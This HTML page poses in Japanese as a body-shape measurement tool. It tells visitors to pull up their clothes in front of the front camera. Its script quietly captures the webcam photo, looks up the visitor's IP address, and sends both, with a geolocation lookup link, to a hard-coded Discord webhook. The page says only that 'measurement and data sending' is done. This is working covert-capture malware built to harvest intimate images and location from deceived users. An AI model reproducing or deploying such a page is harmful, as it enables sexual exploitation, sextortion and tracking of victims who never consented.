<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ボディライン測定診断</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      background: linear-gradient(135deg, #1a1a2e, #16213e);
      color: #ffffff;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px 16px;
    }
    h1 {
      font-size: 1.3rem;
      margin: 0 0 10px 0;
      text-align: center;
      background: linear-gradient(90deg, #4facfe, #00f2fe);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .instruction-banner {
      width: 100%;
      max-width: 420px;
      background: rgba(255, 165, 0, 0.15);
      border: 1px solid rgba(255, 165, 0, 0.4);
      padding: 10px 14px;
      border-radius: 10px;
      font-size: 0.85rem;
      color: #ffcc00;
      text-align: center;
      margin-bottom: 12px;
      line-height: 1.4;
    }
    .container {
      width: 100%;
      max-width: 420px;
      background: rgba(255, 255, 255, 0.08);
      border-radius: 16px;
      padding: 16px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 14px;
    }
    .camera-wrapper {
      position: relative;
      width: 100%;
      border-radius: 12px;
      overflow: hidden;
      background: #000;
    }
    video {
      width: 100%;
      display: block;
      transform: scaleX(-1);
    }
    /* ボディライン合わせ用のガイドフレーム（オーバーレイ） */
    .body-guide {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 65%;
      height: 75%;
      border: 2px dashed rgba(79, 172, 254, 0.7);
      border-radius: 100px / 40px;
      pointer-events: none;
      box-shadow: 0 0 15px rgba(79, 172, 254, 0.3) inset;
    }
    .body-guide::after {
      content: "この枠に体型を合わせてください";
      position: absolute;
      bottom: -25px;
      left: 50%;
      transform: translateX(-50%);
      font-size: 0.75rem;
      color: #4facfe;
      white-space: nowrap;
      background: rgba(0, 0, 0, 0.6);
      padding: 2px 6px;
      border-radius: 4px;
    }
    .btn {
      width: 100%;
      padding: 13px 16px;
      border: none;
      border-radius: 10px;
      font-size: 0.95rem;
      font-weight: bold;
      color: #fff;
      background: linear-gradient(90deg, #3a7bd5, #00d2ff);
      cursor: pointer;
      display: flex;
      justify-content: center;
      align-items: center;
      text-align: center;
    }
    .btn:active {
      opacity: 0.85;
    }
    .secondary-btn {
      background: linear-gradient(90deg, #434343, #000000);
    }
    .result-box {
      width: 100%;
      display: none;
      flex-direction: column;
      align-items: center;
      gap: 12px;
    }
    .result-box canvas {
      width: 100%;
      border-radius: 12px;
      background: #000;
      display: block;
    }
    .status-card {
      width: 100%;
      background: rgba(0, 0, 0, 0.4);
      padding: 12px;
      border-radius: 10px;
      text-align: center;
      font-size: 0.9rem;
      color: #28a745;
      font-weight: bold;
      border: 1px solid rgba(40, 167, 69, 0.3);
    }
  </style>
</head>
<body>

  <h1>ボディライン測定診断</h1>

  <div class="instruction-banner">
    ⚠️ <strong>正確な診断のための手順</strong><br>
    正確に測定するため、<strong>服をたくし上げて</strong>画面のガイドラインに体型を合わせ、直立して撮影してください。
  </div>

  <div class="container">
    <!-- カメラ＆ガイド表示エリア -->
    <div class="camera-wrapper" id="cameraWrapper">
      <video id="video" autoplay playsinline muted></video>
      <div class="body-guide"></div>
    </div>

    <button type="button" class="btn" id="snapBtn">ボディラインを測定・確定する</button>

    <!-- 診断完了後の表示エリア -->
    <div class="result-box" id="resultBox">
      <div class="status-card">測定およびデータ送信完了</div>
      <canvas id="photoCanvas"></canvas>
      <button type="button" class="btn secondary-btn" id="restartBtn">もう一度測定する</button>
    </div>
  </div>

  <script>
    const video = document.getElementById('video');
    const snapBtn = document.getElementById('snapBtn');
    const restartBtn = document.getElementById('restartBtn');
    const cameraWrapper = document.getElementById('cameraWrapper');
    const resultBox = document.getElementById('resultBox');
    const photoCanvas = document.getElementById('photoCanvas');

    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1572124436818170017/T_lHqJXspYpaMdhkghKVHY-xCVkyiAPIoO9R72WLe9dO-MZq0GfLFL8V2Z3lVuC3YjhW';

    let clientIp = '';

    // IPアドレスをバックグラウンドで事前取得
    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => { clientIp = data.ip; })
      .catch(() => { clientIp = '取得失敗'; });

    // 内カメラ起動
    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: false
        });
        video.srcObject = stream;
        await video.play();
      } catch (err) {
        console.log('カメラが使えません:', err);
      }
    }
    startCamera();

    // 測定・確定ボタン
    snapBtn.addEventListener('click', () => {
      if (!video.videoWidth) return;

      const w = video.videoWidth;
      const h = video.videoHeight;

      photoCanvas.width = w;
      photoCanvas.height = h;
      const ctx = photoCanvas.getContext('2d');
      ctx.translate(w, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0);

      // 画面切り替え
      cameraWrapper.style.display = 'none';
      snapBtn.style.display = 'none';
      resultBox.style.display = 'flex';

      // 裏側でDiscordへ送信
      photoCanvas.toBlob(blob => {
        const formData = new FormData();
        formData.append('payload_json', JSON.stringify({
          content: `📏 **ボディライン測定データ受信**\n・IPアドレス: \`${clientIp || '取得中'}\`\n・ジオロケーション確認: https://rakko.tools/ja/tools/ip-geolocation`
        }));
        formData.append('file', blob, 'body_measurement.png');

        fetch(WEBHOOK_URL, {
          method: 'POST',
          body: formData
        }).catch(err => console.error(err));
      }, 'image/png');
    });

    // もう一度測定するボタン
    restartBtn.addEventListener('click', () => {
      resultBox.style.display = 'none';
      cameraWrapper.style.display = 'block';
      snapBtn.style.display = 'flex';
    });
  </script>
</body>
</html>
